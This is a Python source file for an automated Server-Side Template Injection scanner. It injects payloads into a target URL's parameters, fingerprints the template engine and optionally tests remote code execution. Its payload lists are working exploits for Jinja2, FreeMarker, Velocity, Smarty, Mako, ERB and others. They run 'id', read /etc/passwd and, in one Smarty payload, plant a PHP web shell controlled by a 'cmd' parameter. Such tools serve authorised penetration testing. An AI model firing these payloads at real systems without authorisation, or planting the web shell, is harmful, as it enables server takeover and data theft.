#!/usr/bin/env python3
"""
Server-Side Template Injection (SSTI) testing module.

Usage:
    python ssti_tester.py --target https://example.com/page?name=test --output results/
"""

import argparse
import asyncio
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("ssti_tester")


@dataclass
class SSTIVulnerability:
    """Represents a discovered SSTI vulnerability."""

    url: str
    parameter: str
    method: str
    engine: str  # jinja2, twig, freemarker, velocity, etc.
    payload: str
    evidence: str
    confidence: str = "medium"
    rce_possible: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "engine": self.engine,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "confidence": self.confidence,
            "rce_possible": self.rce_possible,
        }


class SSTITester:
    """
    Server-Side Template Injection vulnerability tester.

    Features:
    - Multiple template engine detection
    - Mathematical expression detection
    - RCE payload testing
    - Engine fingerprinting
    """

    # Detection payloads with expected results
    DETECTION_PAYLOADS = [
        # Universal math expression
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2/Twig specific
        ("${{7*7}}", "49"),

        # Alternative expressions
        ("{{7+7}}", "14"),
        ("${7+7}", "14"),
        ("#{7+7}", "14"),

        # String concatenation
        ("{{'a'+'b'}}", "ab"),
        ("${'a'+'b'}", "ab"),
    ]

    # Engine-specific detection payloads
    ENGINE_PAYLOADS = {
        "jinja2": [
            ("{{config}}", r"<Config"),
            ("{{self}}", r"<TemplateReference"),
            ("{{request}}", r"<Request"),
            ("{{7*'7'}}", "7777777"),
            ("{{''.__class__}}", r"<class 'str'>"),
        ],
        "twig": [
            ("{{_self}}", r"__TwigTemplate"),
            ("{{7*'7'}}", "49"),  # Twig evaluates this differently
            ("{{dump(1)}}", r"int\(1\)"),
        ],
        "freemarker": [
            ("${.version}", r"\d+\.\d+"),
            ("${7*7}", "49"),
            ("<#assign x=7*7>${x}", "49"),
        ],
        "velocity": [
            ("#set($x=7*7)$x", "49"),
            ("$class.inspect('java.lang.Runtime')", r"java\.lang\.Runtime"),
        ],
        "smarty": [
            ("{php}echo 7*7;{/php}", "49"),
            ("{math equation='7*7'}", "49"),
        ],
        "mako": [
            ("${7*7}", "49"),
            ("<%import os%>${os.popen('echo test').read()}", "test"),
        ],
        "erb": [
            ("<%= 7*7 %>", "49"),
            ("<%= system('echo test') %>", "test"),
        ],
        "pebble": [
            ("{{7*7}}", "49"),
            ("{{request}}", r"HttpServletRequest"),
        ],
        "thymeleaf": [
            ("[[${7*7}]]", "49"),
            ("[(${7*7})]", "49"),
        ],
        "handlebars": [
            ("{{#with 7}}{{multiply this 7}}{{/with}}", "49"),
        ],
        "jade/pug": [
            ("#{7*7}", "49"),
        ],
    }

    # RCE payloads by engine
    RCE_PAYLOADS = {
        "jinja2": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "twig": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ],
        "velocity": [
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        ],
        "smarty": [
            "{php}system('id');{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system($_GET['cmd']); ?>\",self::clearConfig())}",
        ],
        "mako": [
            "<%import os%>${os.popen('id').read()}",
        ],
        "erb": [
            "<%= system('id') %>",
            "<%= `id` %>",
        ],
    }

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        threads: int = 10,
        test_params: Optional[List[str]] = None,
        methods: Optional[List[str]] = None,
        test_rce: bool = False,
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.test_params = test_params
        self.methods = methods or ["GET"]
        self.test_rce = test_rce
        self.verbose = verbose

        self.vulnerabilities: List[SSTIVulnerability] = []
        self.detected_engines: Set[str] = set()

        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run SSTI tests and return results."""
        result = ScanResult(
            tool="ssti_tester",
            target=self.target,
            config={
                "timeout": self.timeout,
                "threads": self.threads,
                "methods": self.methods,
                "test_rce": self.test_rce,
            },
        )

        logger.info(f"Starting SSTI testing for: {self.target}")

        try:
            # Parse URL for parameters
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)

            if not params and not self.test_params:
                result.add_error("No parameters found. Use --params to specify.")
                logger.warning("No parameters found")
                result.finalize()
                return result

            test_params = self.test_params or list(params.keys())
            logger.info(f"Testing parameters: {test_params}")

            for param in test_params:
                logger.info(f"Testing parameter: {param}")

                # Basic detection
                await self._test_basic_detection(param)

                # Engine fingerprinting
                await self._fingerprint_engine(param)

                # RCE testing (if enabled and vulnerability found)
                if self.test_rce and param in [v.parameter for v in self.vulnerabilities]:
                    await self._test_rce(param)

            # Statistics
            result.stats = {
                "parameters_tested": len(test_params),
                "vulnerabilities_found": len(self.vulnerabilities),
                "engines_detected": list(self.detected_engines),
                "rce_possible": sum(1 for v in self.vulnerabilities if v.rce_possible),
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.CRITICAL if vuln.rce_possible else Severity.HIGH

                result.add_finding(Finding(
                    title=f"SSTI ({vuln.engine}): {vuln.parameter}",
                    severity=severity,
                    description=f"Server-Side Template Injection in {vuln.engine} template engine",
                    url=vuln.url,
                    parameter=vuln.parameter,
                    payload=vuln.payload,
                    evidence=vuln.evidence,
                    metadata={
                        "engine": vuln.engine,
                        "confidence": vuln.confidence,
                        "rce_possible": vuln.rce_possible,
                    },
                    cwe_id="CWE-94",
                    remediation="Never pass user input directly to template engines. Use proper escaping and sandboxing.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _test_basic_detection(self, param: str):
        """Test basic SSTI detection with math expressions."""
        logger.info(f"Testing basic SSTI detection for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload, expected in self.DETECTION_PAYLOADS:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    if expected in response.body:
                        vuln = SSTIVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            engine="unknown",
                            payload=payload,
                            evidence=f"Expression evaluated: {payload} = {expected}",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found SSTI: {param} (payload: {payload})")
                        return

                except Exception as e:
                    logger.debug(f"Error testing payload: {e}")

    async def _fingerprint_engine(self, param: str):
        """Fingerprint the template engine."""
        logger.info(f"Fingerprinting template engine for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for engine, payloads in self.ENGINE_PAYLOADS.items():
                for payload, pattern in payloads:
                    url = self._inject_payload(param, payload)

                    try:
                        response = await client.get(url)

                        if re.search(pattern, response.body, re.IGNORECASE):
                            self.detected_engines.add(engine)

                            # Update existing vulnerability or create new
                            existing = next((v for v in self.vulnerabilities if v.parameter == param), None)
                            if existing:
                                existing.engine = engine
                                existing.confidence = "high"
                            else:
                                vuln = SSTIVulnerability(
                                    url=self.target,
                                    parameter=param,
                                    method="GET",
                                    engine=engine,
                                    payload=payload,
                                    evidence=f"Engine signature matched: {pattern}",
                                    confidence="high",
                                )
                                self.vulnerabilities.append(vuln)

                            logger.info(f"Detected engine: {engine}")
                            return

                    except Exception as e:
                        logger.debug(f"Error fingerprinting: {e}")

    async def _test_rce(self, param: str):
        """Test for Remote Code Execution via SSTI."""
        logger.info(f"Testing RCE for: {param}")

        # Get detected engine for this parameter
        vuln = next((v for v in self.vulnerabilities if v.parameter == param), None)
        if not vuln:
            return

        engine = vuln.engine
        if engine not in self.RCE_PAYLOADS:
            logger.info(f"No RCE payloads for engine: {engine}")
            return

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload in self.RCE_PAYLOADS[engine]:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    # Look for command output indicators
                    rce_indicators = [
                        r"uid=\d+",  # id command output
                        r"root:.*:0:0",  # /etc/passwd content
                        r"www-data",
                        r"apache",
                        r"nginx",
                    ]

                    for indicator in rce_indicators:
                        if re.search(indicator, response.body, re.IGNORECASE):
                            vuln.rce_possible = True
                            vuln.evidence += f"\nRCE confirmed with payload: {payload[:50]}..."
                            logger.info(f"RCE confirmed for: {param}")
                            return

                except Exception as e:
                    logger.debug(f"Error testing RCE: {e}")

    def _inject_payload(self, param: str, payload: str) -> str:
        """Inject payload into parameter."""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if param in params:
            params[param] = [payload]
        else:
            params[param] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"ssti_{self.target_domain}")

        vuln_path = self.output_dir / f"ssti_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump(
                {
                    "target": self.target,
                    "timestamp": timestamp_now(),
                    "engines_detected": list(self.detected_engines),
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="Server-Side Template Injection (SSTI) vulnerability tester"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL with parameters")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--params", help="Parameters to test (comma-separated)")
    parser.add_argument("--test-rce", action="store_true", help="Test for RCE (use with caution)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    test_params = args.params.split(",") if args.params else None

    tester = SSTITester(
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads,
        test_params=test_params,
        test_rce=args.test_rce,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"SSTI Testing Complete: {args.target}")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    print(f"Engines Detected: {list(tester.detected_engines)}")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** VULNERABILITIES FOUND ***")
        for vuln in tester.vulnerabilities:
            rce = "[RCE]" if vuln.rce_possible else ""
            print(f"  [{vuln.confidence.upper()}] {vuln.engine}: {vuln.parameter} {rce}")


if __name__ == "__main__":
    asyncio.run(main())
